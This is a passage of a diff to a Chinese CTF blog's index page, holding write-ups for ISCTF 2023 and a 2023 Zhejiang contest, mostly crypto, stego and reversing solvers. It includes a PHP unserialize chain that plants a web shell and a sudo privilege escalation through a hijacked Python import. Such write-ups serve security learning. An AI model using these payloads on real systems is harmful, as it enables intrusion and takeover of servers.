&quot;23&quot;:&quot;6&quot;,&quot;24&quot;:&quot;7&quot;,&quot;25&quot;:&quot;8&quot;,&quot;26&quot;:&quot;9&quot;,&quot;27&quot;:&quot;0&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;-&quot;,&quot;2e&quot;:&quot;=&quot;,&quot;2f&quot;:&quot;[&quot;,&quot;30&quot;:&quot;]&quot;,&quot;31&quot;:&quot;\\&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;;&quot;,&quot;34&quot;:&quot;&#39;&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;,&quot;,&quot;37&quot;:&quot;.&quot;,&quot;38&quot;:&quot;/&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;
+ 
+shiftKeys = &#123;&quot;04&quot;:&quot;A&quot;, &quot;05&quot;:&quot;B&quot;, &quot;06&quot;:&quot;C&quot;, &quot;07&quot;:&quot;D&quot;, &quot;08&quot;:&quot;E&quot;, &quot;09&quot;:&quot;F&quot;, &quot;0a&quot;:&quot;G&quot;, &quot;0b&quot;:&quot;H&quot;, &quot;0c&quot;:&quot;I&quot;, &quot;0d&quot;:&quot;J&quot;, &quot;0e&quot;:&quot;K&quot;, &quot;0f&quot;:&quot;L&quot;, &quot;10&quot;:&quot;M&quot;, &quot;11&quot;:&quot;N&quot;, &quot;12&quot;:&quot;O&quot;, &quot;13&quot;:&quot;P&quot;, &quot;14&quot;:&quot;Q&quot;, &quot;15&quot;:&quot;R&quot;, &quot;16&quot;:&quot;S&quot;, &quot;17&quot;:&quot;T&quot;, &quot;18&quot;:&quot;U&quot;, &quot;19&quot;:&quot;V&quot;, &quot;1a&quot;:&quot;W&quot;, &quot;1b&quot;:&quot;X&quot;, &quot;1c&quot;:&quot;Y&quot;, &quot;1d&quot;:&quot;Z&quot;,&quot;1e&quot;:&quot;!&quot;, &quot;1f&quot;:&quot;@&quot;, &quot;20&quot;:&quot;#&quot;, &quot;21&quot;:&quot;$&quot;, &quot;22&quot;:&quot;%&quot;, &quot;23&quot;:&quot;^&quot;,&quot;24&quot;:&quot;&amp;&quot;,&quot;25&quot;:&quot;*&quot;,&quot;26&quot;:&quot;(&quot;,&quot;27&quot;:&quot;)&quot;,&quot;28&quot;:&quot;&lt;RET&gt;&quot;,&quot;29&quot;:&quot;&lt;ESC&gt;&quot;,&quot;2a&quot;:&quot;&lt;DEL&gt;&quot;, &quot;2b&quot;:&quot;\t&quot;,&quot;2c&quot;:&quot;&lt;SPACE&gt;&quot;,&quot;2d&quot;:&quot;_&quot;,&quot;2e&quot;:&quot;+&quot;,&quot;2f&quot;:&quot;&#123;&quot;,&quot;30&quot;:&quot;&#125;&quot;,&quot;31&quot;:&quot;|&quot;,&quot;32&quot;:&quot;&lt;NON&gt;&quot;,&quot;33&quot;:&quot;\&quot;&quot;,&quot;34&quot;:&quot;:&quot;,&quot;35&quot;:&quot;&lt;GA&gt;&quot;,&quot;36&quot;:&quot;&lt;&quot;,&quot;37&quot;:&quot;&gt;&quot;,&quot;38&quot;:&quot;?&quot;,&quot;39&quot;:&quot;&lt;CAP&gt;&quot;,&quot;3a&quot;:&quot;&lt;F1&gt;&quot;,&quot;3b&quot;:&quot;&lt;F2&gt;&quot;, &quot;3c&quot;:&quot;&lt;F3&gt;&quot;,&quot;3d&quot;:&quot;&lt;F4&gt;&quot;,&quot;3e&quot;:&quot;&lt;F5&gt;&quot;,&quot;3f&quot;:&quot;&lt;F6&gt;&quot;,&quot;40&quot;:&quot;&lt;F7&gt;&quot;,&quot;41&quot;:&quot;&lt;F8&gt;&quot;,&quot;42&quot;:&quot;&lt;F9&gt;&quot;,&quot;43&quot;:&quot;&lt;F10&gt;&quot;,&quot;44&quot;:&quot;&lt;F11&gt;&quot;,&quot;45&quot;:&quot;&lt;F12&gt;&quot;&#125;
+ 
+ 
+nums = []
+keys = open(r&quot;C:\Users\abc\Desktop\blue.txt&quot;)
+for line in keys:
+    if len(line)!=17: #首先过滤掉鼠标等其他设备的USB流量
+         continue
+    nums.append(line[0:2]+line[4:6]) #取一、三字节
+keys.close()
+output = &quot;&quot;
+for n in nums:
+    if n[2:4] == &quot;00&quot; :
+        continue
+ 
+    if n[2:4] in normalKeys:
+        if n[0:2]==&quot;02&quot;: #表示按下了shift
+            output += shiftKeys [n[2:4]]
+        else :
+            output += normalKeys [n[2:4]]
+    else:
+        output += &#39;&#39;
+print(&#39;output :&#39; + output)
+</code></pre>
+<p>output :<CAP>aggsz{k<CAP>p_wn_<CAP>yrv<CAP>_so<DEL><DEL>sov_je<DEL>mzus<DEL><DEL><DEL>fyffjs!!b<DEL>!}</p>
+<p><cap> -&gt; 大写 <del> -&gt; 删除</p>
+<p>删除的内容“soezusb”为key，剩余”Aggsz{Kp_wn_YRV_sov_jmfyffjs!!!}”为明文维吉尼亚解密</p>
+<p>得到flag:<code>Isctf&#123;So_ez_USB_and_vigenere!!!&#125;</code></p>
+<h2 id="sudopy"><a href="#sudopy" class="headerlink" title="sudopy"></a>sudopy</h2><p>需要提权 sudo-l</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/aa37090c3bb0a151bba91222a5710212.png" alt="image-20231128121721526"></p>
+<p>web.py内无参数可控</p>
+<p>但是import了 webbrowser.py</p>
+<p>我们在同目录写一个 webbrowser.py</p>
+<pre><code class="py">import os
+
+def open(url):
+    res = os.popen(&quot;./flag&quot;).read()
+    print(res)
+</code></pre>
+<p>然后sudo执行</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6e47c7c9264f336654c4569543beeb7e.png" alt="image-20231128123720025"></p>
+<h2 id="PNG的基本食用"><a href="#PNG的基本食用" class="headerlink" title="PNG的基本食用"></a>PNG的基本食用</h2><p>part1 crc爆破宽高</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b7118f1ed916b66532d604d5137a6de8.png" alt="image-20231128172750435"></p>
+<p>part2</p>
+<p>有个wbstego 没找到key 根据语义猜测easy</p>
+<p>或许是这个(<img src="https://img-blog.csdnimg.cn/img_convert/ed7c44d4b42a2aa717a2126a4e7899ac.png" alt="image-20231129194126432"></p>
+<p>part3 lsb隐写了一个7z 可以手动弄出来 不弄出来也可以直接看见里面的明文</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/036547c409d3cdaac60b65a612348cdf.png" alt="image-20231128172838694"></p>
+<p>最终 png-is-easy-for-you</p>
+<h2 id="Beyond-Hex-Meet-Heptadecimal"><a href="#Beyond-Hex-Meet-Heptadecimal" class="headerlink" title="Beyond Hex, Meet Heptadecimal"></a>Beyond Hex, Meet Heptadecimal</h2><p>看看构造</p>
+<pre><code class="py">table = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
+data = &quot;ID71QI6UV7NRV5ULVJDJ1PTVJDVINVBQUNT&quot;
+flag = &quot;&quot;
+
+for i in data:
+    print(bin(table.index(i))[2:])
+</code></pre>
+<p><img src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=C:%5CUsers%5CKagarino%20kirie%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20231128230928977.png&pos_id=img-wD3NGp24-1701258522149" alt="外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传"></p>
+<p>补到5位解码试试</p>
+<pre><code class="py">from Crypto.Util.number import *
+
+table = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
+data = &quot;ID71QI6UV7NRV5ULVJDJ1PTVJDVINVBQUNT&quot;
+flag = &quot;&quot;
+
+for i in data:
+    flag += bin(table.index(i))[2:].zfill(5)
+
+print(long_to_bytes(int(flag)))
+# b&#39;\x04\x0c\x16\xc1\xb0L\xd3u\x95\x03\xbfv\x98\xf0V\x13\x05\xfcv?\xf3)\xf3\xf3\x0e\xb3\xd0\x91zD\xdd(P\x95\x08\xd4\xc3Q\x96\xee\x1e\xd6$\\\xce\xbf\xae\x17rW+\xffJ\x01V\x97W\x18tT%\r\xb7\xf0rZU.\xfe\x17\x8a,\xbd&#39;
+</code></pre>
+<p>那尝试手动写个flag头看看二进制</p>
+<pre><code class="py"># 1001001101001110000111010100100011011110111110011110111110111111100101111101010111111100110110110011000011100111101111111001101101111111001010111111110101111010111101011111101
+# 100100110100111000011101010010001101111011
+</code></pre>
+<p>发现是完全对的上的</p>
+<p>只是7位一输出 那么最终脚本为</p>
+<pre><code class="py">table = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;
+data = &quot;ID71QI6UV7NRV5ULVJDJ1PTVJDVINVBQUNT&quot;
+flag=&quot;&quot;
+for i in data:
+    flag+=bin(table.index(i))[2:].zfill(5)
+
+for i in range(int(len(flag)/7)):
+    ascii_value = int(flag[i * 7:i * 7 + 7], 2)
+    print(chr(ascii_value), end=&quot;&quot;)
+</code></pre>
+<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h2 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h2><p>运行即可</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f1253ade9486a834d5eaaf9ea6b11f92.png" alt="image-20231122191148437"></p>
+<h2 id="babyRe"><a href="#babyRe" class="headerlink" title="babyRe"></a>babyRe</h2><p>一看output先猜e&#x3D;65537的rsa</p>
+<pre><code class="py">from Crypto.Util.number import *
+import gmpy2
+from z3 import *
+ppq = 292884018782106151080211087047278002613718113661882871562870811030932129300110050822187903340426820507419488984883216665816506575312384940488196435920320779296487709207011656728480651848786849994095965852212548311864730225380390740637527033103610408592664948012814290769567441038868614508362013860087396409860
+pp1p = 21292789073160227295768319780997976991300923684414991432030077313041762314144710093780468352616448047534339208324518089727210764843655182515955359309813600286949887218916518346391288151954579692912105787780604137276300957046899460796651855983154616583709095921532639371311099659697834887064510351319531902433355833604752638757132129136704458119767279776712516825379722837005380965686817229771252693736534397063201880826010273930761767650438638395019411119979149337260776965247144705915951674697425506236801595477159432369862377378306461809669885764689526096087635635247658396780671976617716801660025870405374520076160
+c = 5203005542361323780340103662023144468501161788183930759975924790394097999367062944602228590598053194005601497154183700604614648980958953643596732510635460233363517206803267054976506058495592964781868943617992245808463957957161100800155936109928340808755112091651619258385206684038063600864669934451439637410568700470057362554045334836098013308228518175901113235436257998397401389511926288739759268080251377782356779624616546966237213737535252748926042086203600860251557074440685879354169866206490962331203234019516485700964227924668452181975961352914304357731769081382406940750260817547299552705287482926593175925396
+# p,q = Ints(&quot;p q&quot;)
+# s =Solver()
+# s.add(p+q == ppq, (p+1)*(q+1) == pp1p)
+# s.check()
+# print(s.model())
+
+q = 134094011928749729545065371362722609977806129489242508442578343348280145193982491886499134122427647316566435728309986082300710321155285426063169136067309204867535093965561302236683205598674944172719159174122755219401284720417311361738339972425053993540349468981181899812597265310200720861584501167926682130629
+p = 158790006853356421535145715684555392635911984172640363120292467682651984106127558935688769217999173190853053256573230583515796254157099514425027299853011574428952615241450354491797446250111905821376806678089793092463445504963079378899187060678556415052315479031632390956970175728667893646777512692160714279231
+n = p*q
+e = 65537
+d = gmpy2.invert(e,(p-1)*(q-1))
+print(long_to_bytes(pow(c,d,n)))
+</code></pre>
+<h2 id="eazyre"><a href="#eazyre" class="headerlink" title="eazyre"></a>eazyre</h2><p>非预期 hint2给了md5</p>
+<p>somd5一把梭</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/4d1074514399e60101c396de2c092082.png" alt="image-20231125073855061"></p>
+<h2 id="easy-z3"><a href="#easy-z3" class="headerlink" title="easy_z3"></a>easy_z3</h2><pre><code class="py">from z3 import*
+from Crypto.Util.number import *
+# print(&quot;Please input flag:&quot;)
+# flag = input()
+# if len(flag)!=42:
+# 	print(&quot;Check your length!&quot;)
+# 	exit()
+
+# l=[]
+# for i in range(6):
+# 	s=&quot;&quot;
+# 	for j in flag[i*7:i*7+7]:
+# 		s+=hex(ord(j))[2:]
+# 	l.append(int(s,16))
+# if (
+
+x1, x2, x3, x4, x5, x6 = Ints(&quot;x1 x2 x3 x4 x5 x6&quot;)
+x = [x1,x2,x3,x4,x5,x6]
+s = Solver()
+s.add(
+(593*x[5] + 997*x[0] + 811*x[1] + 258*x[2] + 829*x[3] + 532*x[4])== 0x54eb02012bed42c08 ,
+(605*x[4] + 686*x[5] + 328*x[0] + 602*x[1] + 695*x[2] + 576*x[3])== 0x4f039a9f601affc3a ,
+(373*x[3] + 512*x[4] + 449*x[5] + 756*x[0] + 448*x[1] + 580*x[2])== 0x442b62c4ad653e7d9 ,
+(560*x[2] + 635*x[3] + 422*x[4] + 971*x[5] + 855*x[0] + 597*x[1])== 0x588aabb6a4cb26838 ,
+(717*x[1] + 507*x[2] + 388*x[3] + 925*x[4] + 324*x[5] + 524*x[0])== 0x48f8e42ac70c9af91 ,
+(312*x[0] + 368*x[1] + 884*x[2] + 518*x[3] + 495*x[4] + 414*x[5])== 0x4656c19578a6b1170
+)
+s.check()
+print(s.model())
+# ):
+# 	print(&quot;Good job!&quot;)
+# else:
+# 	print(&quot;Wrong\nTry again!!!&quot;)
+# 	exit()
+
+x6= 26860403902456189
+x4= 32765855640286324
+x5= 28554726411354222
+x3= 31015537033047360
+x2= 13615593641303915
+x1 = 20639221941697358
+x = [x1, x2, x3, x4, x5, x6]
+for i in range(6):
+    print(long_to_bytes(x[i]).decode(),end=&quot;&quot;)
+</code></pre>
+<h2 id="FloweyRSA"><a href="#FloweyRSA" class="headerlink" title="FloweyRSA"></a>FloweyRSA</h2><p><img src="https://img-blog.csdnimg.cn/img_convert/cdd3662d0a4492efa938c288b6e9c57b.png" alt="image-20231128185327721"></p>
+<p>e &#x3D; 465</p>
+<p>n &#x3D; 3162244531</p>
+<p>ezrsa</p>
+<pre><code class="py">from Crypto.Util.number import *
+import gmpy2
+
+n = 3162244531
+c = [0x753C2EC5, 0x8D90C736, 0x81282CB0, 0x7EECC470, 0x944E15D3,0x2C7AC726, 0x717E8070, 0x30CBE439, 0x0B1D95A9C, 0x6DB667BB,0x1240463C, 0x77CBFE64, 0x11D8BE59]
+e = 465
+
+p = 56099
+q = 56369
+
+
+d = gmpy2.invert(e,(p-1)*(q-1))
+res = [long_to_bytes(pow(i,d,n)).decode() for i in c]
+
+print(&quot;&quot;.join(res))
+</code></pre>
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="test-nc"><a href="#test-nc" class="headerlink" title="test_nc"></a>test_nc</h2><p>nc连上去就行</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5f8076c5b90f1e3e7951c8fec7548d9b.png" alt="image-20231123131814088"></p>
+<h2 id="nc-shell"><a href="#nc-shell" class="headerlink" title="nc_shell"></a>nc_shell</h2><p>cat &#x2F;flag  </p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/11/29/ISCTF2023%20%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
+    <a href="/2023/11/05/2023%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B%20%E9%83%A8%E5%88%86wp/">
+        <h2 class="post-title">2023浙江省大学生信息安全竞赛初赛 部分wp</h2>
+    </a>
+    <div class="category-and-date">
+        
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/11/5
+        </span>
+        
+        
+    </div>
+    <div class="description">
+        <div class="content" v-pre>
+            
+            <h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="easy-php"><a href="#easy-php" class="headerlink" title="easy php"></a>easy php</h4><p>BBB::__debuginfo() -&gt; CCC::__toString() -&gt; AAA::__call()</p>
+<pre><code class="php">&lt;?php
+class AAA&#123;
+    public $cmd;
+
+    public function __call($name, $arguments)&#123;
+        eval($this-&gt;cmd);
+        return &quot;done&quot;;
+    &#125;
+&#125;
+
+class BBB&#123;
+    public $param1;
+    public function __construct($param1)&#123;
+        $this-&gt;param1 = $param1;
+    &#125;
+    public function __debuginfo()&#123;
+        return [
+            &#39;debugInfo&#39; =&gt; &#39;param1&#39; . $this-&gt;param1 
+        ];
+    &#125;
+&#125;
+
+class CCC&#123;
+    public $func;
+
+    public function __toString()&#123;
+        var_dump(&quot;aaa&quot;);
+        $this-&gt;func-&gt;aaa();
+    &#125;
+&#125;
+
+if(isset($_GET[&#39;aaa&#39;]))&#123;
+    $aaa = $_GET[&#39;aaa&#39;];
+    var_dump(unserialize($aaa));
+&#125;
+
+
+$C = new CCC();
+$B = new BBB($C);
+$A = new AAA();
+$A -&gt;cmd= &quot;file_put_contents(&#39;shell.php&#39;,&#39;&lt;?php eval(\$_POST[1]);?&gt;&#39;);&quot;;
+$C-&gt;func = $A; 
+
+echo serialize($B);
+# O:3:&quot;BBB&quot;:1:&#123;s:6:&quot;param1&quot;;O:3:&quot;CCC&quot;:1:&#123;s:4:&quot;func&quot;;O:3:&quot;AAA&quot;:1:&#123;s:3:&quot;cmd&quot;;s:58:&quot;file_put_contents(&#39;shell.php&#39;,&#39;&lt;?php eval($_POST[1]);?&gt;&#39;);&quot;;&#125;&#125;&#125;
+</code></pre>
+<h3 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h3><h4 id="pyccc"><a href="#pyccc" class="headerlink" title="pyccc"></a>pyccc</h4><p>uncompyle6.exe 逆不出py</p>
+<p>逆出如下文件<img src="https://img-blog.csdnimg.cn/img_convert/2132a7f79acde9b99fec3ef17caef4a5.png" alt="image-20231104140256253"></p>
+<p>分析可知 先初始化一个数组 再对其内的每个元素异或其下标</p>
+<pre><code class="py">c=[102,109,99,100,127,52,114,88,97,122,85,125,105,127,119,80,120,112,98,39,109,52,55,106]
+# print(len(c))
+tem = &quot;&quot;
+for i in range(len(c)):
+    tem += chr((c[i]) ^ i)
+print(tem,end=&quot;&quot;)
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/97f99383b91c3086ecf93b42cd5caf67.png" alt="image-20231104140349545"></p>
+<p><code>flag&#123;1t_is_very_hap4y!!&#125;</code></p>
+<h4 id="ezapk"><a href="#ezapk" class="headerlink" title="ezapk"></a>ezapk</h4><p>反编译apk</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/cc6e872e77f4a7cd12faf8860333949d.png" alt="image-20231104153119840"></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/518415be9fa2072797ae8b09314afa40.png" alt="image-20231104153114211"></p>
+<p>解aes</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d2df136fd6f002dab1cffd00a0e0b2c3.png" alt="image-20231104153136786"></p>
+<h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="小小数学家"><a href="#小小数学家" class="headerlink" title="小小数学家"></a>小小数学家</h4><p>re 匹配数字和符号进行运算</p>
+<pre><code class="py">import re
+num = re.compile(&quot;\d+&quot;)
+symble = re.compile(&quot;\W&quot;)
+
+with open(&quot;./flag.txt&quot;, &quot;r&quot;)as f:
+    lines = f.readlines()
+
+    for line in lines:
+        nums = (num.findall(line))
+        symbles = (symble.findall(line))
+        print(chr(int(eval(nums[0]+ symbles[0] + nums[1]))),end=&quot;&quot;)
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/01afb93e696c8076d3af8ff0d178d1b1.png" alt="image-20231104140435619"></p>
+<p><code>DASCTF&#123;9d811301-281b-4f4a-8d1a-b38beccf2285&#125;</code></p>
+<h4 id="基础数论"><a href="#基础数论" class="headerlink" title="基础数论"></a>基础数论</h4><p>sage解p^2^ + q^2^ &#x3D;n</p>
+<pre><code class="py">import hashlib
+
+c = 173178061442550241596295506150572803829268102881297542445649200353047297914764783385643705889370567071577408829104128703765633248277722687055281420899564198724968491216409225857070531370724352556864154450614891750313803499101686782558259953244119778256806332589612663957000269869144555485216828399422391672121
+x,y = (two_squares(c))
+print(x,y)
+print(hashlib.md5(str(x+y).encode()).hexdigest())
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/744bf323695ef992300499edf927e1f8.png" alt="image-20231104151117235"></p>
+<p><code>8ef20a4873c5ec776dd34bf5f0eb56cf</code></p>
+<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="number-game"><a href="#number-game" class="headerlink" title="number game"></a>number game</h4><p>后端就只有个js文件，可以发现roll这段代码很关键（因为题目说通过roll得到flag）</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/65758afd84e5437a7c04fd88757a067d.png" alt="image-20231104164051987"></p>
+<p>将这段js复制处理，放入console，把if的判断条件改为true，然后再次点击roll，可以发现弹<br>flag了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/06f8e7b64fae01d507122fce7cfbf72e.png" alt="image-20231104164058097"></p>
+<h4 id="Ez-misc"><a href="#Ez-misc" class="headerlink" title="Ez_misc"></a>Ez_misc</h4><p>拿到题目，根据jpg的文件头，可以发现每两位16进制是反的，那么我们只需要翻转就行了</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/f7152ce4d0be87c5fd2e237eecc7df73.png" alt="image-20231104164116883"></p>
+<p>使用脚本进行反转</p>
+<pre><code class="py">&#39;&#39;&#39;
+A.bin
+21.7.22
+&#39;&#39;&#39;
+input=open(&#39;C:/Users/Abin/Desktop/yuanshen&#39;,&#39;rb&#39;)
+input_all = input.read()
+ss =input_all[::-1]
+output=open(&#39;C:/Users/Abin/Desktop/y.zip&#39;,&#39;wb&#39;)
+output.write(ss)
+input.close()
+output.close()
+</code></pre>
+<p>反转之后的结果并不是正确的（因为是逆序的十六进制），我们还需要将整体的字符串反<br>转，这里我使用工具进行反转</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/133d497c8418af4c60398b9d0b1a0b49.png" alt="image-20231104164158024"></p>
+<p>数据放入010中生成图片</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/d8b3dae39057297c55b1ff18fcfde523.png" alt="image-20231104164209165"></p>
+<p>使用steghide进行解密，获得flag.txt</p>
+<pre><code>DASHDOTDOTDOTDOT DASHDOTDOTDOTDOT DASHDOTDOTDOTDOT DASHDOTDASHDOT
+DASHDOTDOTDOTDOT DOTDASHDASHDASHDASH DASHDOTDOTDOTDOT DASHDASHDOTDOTDOT
+DASHDASHDOTDOTDOT DASHDOTDOTDOT DASHDOTDOTDOTDOT DOTDOTDOTDOTDASH
+DASHDOTDOTDOTDOT DASHDOTDOTDOTDOT DOTDOTDOTDASHDASH DOTDOTDOTDOTDASH
+DASHDOTDOTDOTDOT DASHDOTDOTDOTDOT DOTDOTDOTDASHDASH DASHDOTDOTDOTDOT
+DOTDOTDOTDASHDASH DOTDOTDOTDASHDASH DOTDOTDOTDASHDASH DOTDOTDOTDOTDOT
+DASHDOTDOTDOTDOT DOTDASHDASHDASHDASH DASHDOTDOTDOTDOT
+DOTDOTDASHDASHDASH DOTDOTDOTDASHDASH DOTDOTDOTDASHDASH
+DOTDOTDOTDASHDASH DOTDOTDOTDOTDASH DOTDOTDOTDASHDASH DOTDOTDASHDASHDASH
+DASHDOTDOTDOTDOT DOTDASHDASHDASHDASH DOTDOTDOTDASHDASH DOTDOTDOTDOTDOT
+DASHDOTDOTDOTDOT DOTDOTDASHDASHDASH DOTDOTDOTDASHDASH DOTDOTDOTDASHDASH
+DASHDOTDOTDOTDOT DOTDOTDASHDASHDASH DASHDOTDOTDOTDOT DOTDOTDASHDASHDASH
+DOTDOTDOTDASHDASH DASHDASHDASHDOTDOT DOTDOTDOTDASHDASH DOTDOTDOTDOTDOT
+DOTDOTDOTDASHDASH DOTDOTDOTDOTDOT DASHDOTDOTDOTDOT DOTDASHDASHDASHDASH
+DOTDOTDOTDASHDASH DOTDOTDOTDOTDASH DOTDOTDOTDASHDASH DASHDOTDOTDOTDOT
+DOTDOTDOTDASHDASH DOTDOTDOTDOTDASH DASHDOTDOTDOTDOT DOTDOTDOTDOTDASH
+DOTDOTDOTDASHDASH DASHDASHDOTDOTDOT DASHDOTDOTDOTDOT DOTDOTDASHDASHDASH
+DASHDOTDOTDOTDOT DOTDOTDASHDASHDASH DOTDOTDOTDASHDASH DOTDOTDOTDOTDASH
+DASHDOTDOTDOTDOT DOTDOTDOTDOTDOT DASHDOTDOTDOTDOT DOTDOTDOTDASHDASH
+DASHDASHDOTDOTDOT DASHDOTDOT
+</code></pre>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/2a383636f79c1c872b6d15f9ad33531a.png" alt="image-20231104164227594"></p>
+<p>根据摩斯密码的特征，及那个DASH转为-，DOT转为.，获得下面的代码</p>
+<p>-…. -…. -…. -.-. -…. .—- -…. –… –… -… -…. ….- -…. -…. …– ….- -…. -…. …– -…. …– …– …–<br>….. -…. .—- -…. ..— …– …– …– ….- …– ..— -…. .—- …– ….. -…. ..— …– …– -…. ..— -….<br>..— …– —.. …– ….. …– ….. -…. .—- …– ….- …– -…. …– ….- -…. ….- …– –… -…. ..— -….<br>..— …– ….- -…. ….. -…. …– –… -..</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/6685a14eb5b45c6613efcb0e08e10d05.png" alt="image-20231104164246025"></p>
+<p>解得flag<br><code>flag&#123;df4f635ab342a5b3bb855a464d7bb4ec&#125;</code></p>
+
+            
+        </div>
+    </div>
+    <div class="post-tags">
+        
+        <span class="icon">
+            <i class="fa-solid fa-tags fa-fw"></i>
+        </span>
+        
+        
+        
+        <span class="tag">
+            
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+        </span>
+        
+        <span class="tag">
+            
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00a596">安全</a>
+        </span>
+        
+    </div>
+    <a href="/2023/11/05/2023%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%88%9D%E8%B5%9B%20%E9%83%A8%E5%88%86wp/" class="go-post">阅读全文</a>
+</div>
+
+<div class="post">
     <a href="/2023/11/01/SHCTF%20%E6%9C%AA%E5%87%BA%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/">
         <h2 class="post-title">SHCTF 未出题目复盘</h2>
     </a>
@@ -365,12 +1540,12 @@ for i in res1:
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00a596">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #00bcd4">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ff7d73">安全</a>
         </span>
         
     </div>
@@ -444,12 +1619,12 @@ print(long_to_bytes(pow(c,d,pp*qq)))
         
         <span class="tag">
             
-            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">网络安全</a>
+            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="color: #ff7d73">网络安全</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #00bcd4">安全</a>
+            <a href="/tags/%E5%AE%89%E5%85%A8/" style="color: #ffa2c4">安全</a>
         </span>
         
     </div>
@@ -548,12 +1723,12 @@ public class CC2 &#123;
         
         <span class="tag">
             
-            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #03a9f4">开发语言</a>
+            <a href="/tags/%E5%BC%80%E5%8F%91%E8%AF%AD%E8%A8%80/" style="color: #00bcd4">开发语言</a>
         </span>
         
         <span class="tag">
             
-            <a href="/tags/java/" style="color: #ff7d73">java</a>
+            <a href="/tags/java/" style="color: #ffa2c4">java</a>
         </span>
         
     </div>
@@ -598,7 +1773,7 @@ public class CC2 &#123;
         
         <span class="tag">
             
